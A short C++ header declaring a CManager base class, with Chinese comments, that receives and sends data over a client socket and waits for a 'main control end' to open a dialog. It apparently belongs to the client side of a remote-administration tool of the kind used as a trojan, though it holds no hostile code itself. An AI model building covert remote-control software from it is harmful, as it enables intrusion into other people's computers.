#pragma once
#include <stdio.h>
#include "ClientSocket.h"

class CManager     //该类是一个父类 实现了虚函数
{

public:
	friend class CClientSocket;                   //这里不加报错
	CManager(CClientSocket *pClient);
	virtual ~CManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	int CManager::Send(LPBYTE lpData, UINT nSize);
	CClientSocket	*m_pClient;


	HANDLE	m_hEventDlgOpen;    //等待主控制端打开窗口  当主控制端发送了COMMAND_NEXT 消息后 我们就会调用NotifyDialogIsOpen 函数设置事件授信
	void WaitForDialogOpen();
	void NotifyDialogIsOpen();

private:
};

